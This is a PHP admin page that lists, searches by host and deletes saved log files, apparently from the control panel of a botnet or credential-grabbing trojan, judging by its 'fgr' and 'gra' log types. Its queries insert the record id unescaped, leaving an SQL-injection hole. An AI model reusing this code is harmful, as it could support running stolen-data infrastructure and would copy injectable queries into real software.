<?php
$page['count_page'] = 25;
$smarty->assign('rand_name', mt_rand(0000000000, 9999999999));

if(!empty($Cur['id'])){
	$del_log = $mysqli->query('SELECT * FROM bf_save_ilog WHERE (id = \''.$Cur['id'].'\') LIMIT 1');
	if($Cur['id'] == $del_log->id){		switch($del_log->type){			case 5: $type = 'fgr'; break;
			case 6: $type = 'gra'; break;
		}
		if(file_exists('logs/save_logs/' . $type . '/' . $del_log->md5)) unlink('logs/save_logs/' . $type . '/' . $del_log->md5);
		$mysqli->query('delete from bf_save_ilog where (id = \''.$del_log->id.'\')');
	}
}

$mysqli->query('SELECT * FROM bf_save_ilog');
if(!empty($_POST['name'])){	$names = explode("\n", $_POST['name']);
	if(count($names) > 0){
        $sql = '';
		foreach($names as $name){			if(preg_match('~^([a-zA-Z0-9-_.]+)$~', $name)){				if(!empty($sql)) $sql .= ' OR ';
				$sql .= '(host LIKE \'%'.$name.'%\')';
			}
		}
		$unnecessary = $mysqli->query('SELECT * FROM bf_save_ilog WHERE '.$sql.' ORDER by id ASC LIMIT ' . ($Cur['page'] == 0 ? 0 : $Cur['page']*$page['count_page']).','.$page['count_page'], null, null, false);
	    $count_items = $mysqli->query_name('SELECT COUNT(id) count FROM bf_save_ilog WHERE '.$sql);
	}else{		$unnecessary = $mysqli->query('SELECT * FROM bf_save_ilog ORDER by id ASC LIMIT ' . ($Cur['page'] == 0 ? 0 : $Cur['page']*$page['count_page']).','.$page['count_page'], null, null, false);
    	$count_items = $mysqli->query_name('SELECT COUNT(id) count FROM bf_save_ilog');
	}
}else{	$unnecessary = $mysqli->query('SELECT * FROM bf_save_ilog ORDER by id ASC LIMIT ' . ($Cur['page'] == 0 ? 0 : $Cur['page']*$page['count_page']).','.$page['count_page'], null, null, false);
    $count_items = $mysqli->query_name('SELECT COUNT(id) count FROM bf_save_ilog');
}

$smarty->assign('unnecessary', $unnecessary);
$smarty->assign('count_items', $count_items);
$smarty->assign('pages', html_pages('/logs/savelog'.(!empty($Cur['id']) ? '-'.$Cur['id'] : '').'.html?window=1&', $count_items, $page['count_page'], 1, 'load_data_save', 'this.href'));

?>